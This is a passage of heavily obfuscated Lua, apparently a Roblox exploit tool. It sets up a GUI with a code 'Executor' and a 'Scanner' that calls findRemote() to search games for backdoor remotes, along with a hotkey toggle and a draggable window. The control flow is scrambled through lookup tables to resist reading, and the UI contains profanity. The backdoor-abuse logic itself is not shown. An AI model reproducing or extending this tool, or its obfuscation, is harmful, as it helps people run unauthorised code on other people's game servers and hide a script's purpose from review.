        wait(0.5)
        GUI.Executor.Clear.Button.Text='Clear'
    end)
    searching=false
    GUI.Scanner.Button.MouseButton1Click.Connect(GUI.Scanner.Button.MouseButton1Click,function()
        local p,J,ca
        ca,J={[5633]=23226,[18706]=-24607,[-29312]=-11262,[23321]=30101,[31563]=-11262,[29721]=-1593,[-7255]=17525},function(bc)
            return ca[bc+21443]
        end
        p=J(-28698)
        repeat
            while true do
                if p==-24607 then
                    GUI.Scanner.Button.Text='Scanning.'
                    wait(0.20000000000000001)
                    GUI.Scanner.Button.Text='Scanning..'
                    wait(0.20000000000000001)
                    GUI.Scanner.Button.Text='Scanning...'
                    GUI.Scanner.Button.Text='Scanning.'
                    wait(0.20000000000000001)
                    GUI.Scanner.Button.Text='Scanning..'
                    wait(0.20000000000000001)
                    GUI.Scanner.Button.Text='Scanning...'
                    GUI.Scanner.Button.Text='NO BACKDOOR BITCH'
                    searching=false
                    p=J(8278)
                elseif p==-1593 then
                    p=J(10120)
                elseif p==-11262 then
                    p=J(1878);
                    break;
                elseif p==17525 then
                    if not searching then
                        p=J(-15810)
                        break
                    end
                    p=J(-50755)
                elseif p==23226 then
                    searching=true
                    debug('Scanning...',1)
                    GUI.Scanner.Button.Text='Scanning.'
                    wait(0.20000000000000001)
                    GUI.Scanner.Button.Text='Scanning..'
                    wait(0.20000000000000001)
                    GUI.Scanner.Button.Text='Scanning...'
                    if not findRemote()then
                        p=J(-2737)
                        break
                    end
                    p=-1593
                end
            end
        until p==30101
    end)
    game.GetService(game,'UserInputService').InputBegan.Connect(game.GetService(game,'UserInputService').InputBegan,function(da,Ya)
        local Tb,m,ic
        ic,Tb={[-20687]=17544,[-13386]=6049,[19389]=22710,[-6465]=-27187,[-27931]=22710,[-9626]=12466,[30913]=17544,[-29683]=11636,[2056]=22710,[-4155]=-983},function(Vb)
            return ic[Vb+9414]
        end
        m=Tb(-13569)
        repeat
            while true do
                if m==-27187 then
                    GUI.Visible=true
                    m=Tb(9975)
                elseif m==22710 then
                    m=Tb(21499)
                elseif m==6049 then
                    GUI.Visible=false
                    m=Tb(-7358)
                elseif m==12466 then
                    if GUI.Visible then
                        m=Tb(-22800)
                        break
                    else
                        m=Tb(-15879)
                        break
                    end
                    m=Tb(-37345)
                elseif m==17544 then
                    m=Tb(-39097);
                    break;
                elseif m==-983 then
                    if(da.KeyCode==Enum.KeyCode.P and not Ya)then
                        m=Tb(-19040)
                        break
                    end
                    m=Tb(-30101)
                end
            end
        until m==11636
    end)
end;
task.spawn(Gb);
local function ob()
    local Va,Aa=ma['2\49'],game.GetService(game,'UserInputService');
    function dragify(Hb)
        local D,l,W,X,G
        G,D={[10808]=12513,[20260]=14002},function(xa)
            return G[xa- -25227]
        end
        W=D(-4967)
        repeat
            while true do
                if W==14002 then
                    dragToggle=nil
                    X=0.33000000000000002
                    dragInput=nil
                    dragStart=nil
                    l=nil
                    function updateInput(C)
                        local I=C.Position-dragStart
                        local F=UDim2 .new(startPos.X.Scale,startPos.X.Offset+I.X,startPos.Y.Scale,startPos.Y.Offset+I.Y)
                        game.GetService(game,'TweenService').Create(game.GetService(game,'TweenService'),Hb,TweenInfo.new(0.14999999999999999),{Position=F}).Play(game.GetService(game,'TweenService').Create(game.GetService(game,'TweenService'),Hb,TweenInfo.new(0.14999999999999999),{Position=F}))
                    end
                    Hb.InputBegan.Connect(Hb.InputBegan,function(Cb)
                        local Ma,z,_
                        Ma,_={[6814]=1460,[-24172]=-12863,[15025]=17600,[23360]=19192},function(Jb)
                            return Ma[Jb- -32458]
                        end
                        z=_(-9098)
                        repeat
                            while true do
                                if z==19192 then
                                    if(Cb.UserInputType==Enum.UserInputType.MouseButton1 or Cb.UserInputType==Enum.UserInputType.Touch)and Aa.GetFocusedTextBox(Aa)==nil then
                                        z=_(-56630)
                                        break
                                    end
                                    z=17600
                                elseif z==-12863 then
                                    dragToggle=true
                                    dragStart=Cb.Position
                                    startPos=Hb.Position
                                    Cb.Changed.Connect(Cb.Changed,function()
                                        local Pa,fc,db
                                        fc,Pa={[9902]=-720,[-2520]=4828,[26439]=-720,[-11736]=-19634,[17921]=-32095},function(mb)
                                            return fc[mb+25281]
                                        end
                                        db=Pa(-7360)
                                        repeat
                                            while true do
                                                if db==-720 then
                                                    db=Pa(-27801);
                                                    break;
                                                elseif db==-32095 then
                                                    if Cb.UserInputState==Enum.UserInputState.End then
                                                        db=Pa(-37017)
                                                        break
                                                    end
                                                    db=Pa(-15379)
                                                elseif db==-19634 then
                                                    dragToggle=false
                                                    db=Pa(1158)
                                                end
                                            end
                                        until db==4828
                                    end)
                                    z=_(-17433)
                                elseif z==17600 then
                                    z=_(-25644);
                                    break;
                                end
                            end
                        until z==1460
                    end)
                    Hb.InputChanged.Connect(Hb.InputChanged,function(ea)
                        local ha,fa,h
                        h,fa={[25289]=-30290,[-1883]=-8275,[10873]=-6459,[-19981]=-8275,[-4802]=18325},function(Z)
                            return h[Z- -14389]
                        end
                        ha=fa(-19191)
                        repeat
                            while true do
                                if ha==18325 then
                                    if ea.UserInputType==Enum.UserInputType.MouseMovement or ea.UserInputType==Enum.UserInputType.Touch then
                                        ha=fa(10900)
                                        break
                                    end
                                    ha=fa(-34370)
                                elseif ha==-8275 then
                                    ha=fa(-3516);
                                    break;
                                elseif ha==-30290 then
                                    dragInput=ea
                                    ha=fa(-16272)
                                end
                            end
                        until ha==-6459
                    end)
                    game.GetService(game,'UserInputService').InputChanged.Connect(game.GetService(game,'UserInputService').InputChanged,function(Ba)
                        local _b,k,xb
                        _b,k={[-11956]=-24807,[26142]=-575,[-6410]=8745,[-28712]=28390},function(wb)
                            return _b[wb+25163]
                        end
                        xb=k(-53875)
                        repeat
                            while true do
                                if xb==28390 then
                                    if Ba==dragInput and dragToggle then
                                        xb=k(979)
                                        break
                                    end
                                    xb=-24807
                                elseif xb==-575 then
                                    updateInput(Ba)
                                    xb=k(-37119)
                                elseif xb==-24807 then
                                    xb=k(-31573);
                                    break;
                                end
                            end
                        until xb==8745
                    end)
                    W=D(-14419)
                    break
                end
            end
        until W==12513
    end
    dragify(Va.Parent.Frame)
end;
task.spawn(ob);
return ma['1'],require;
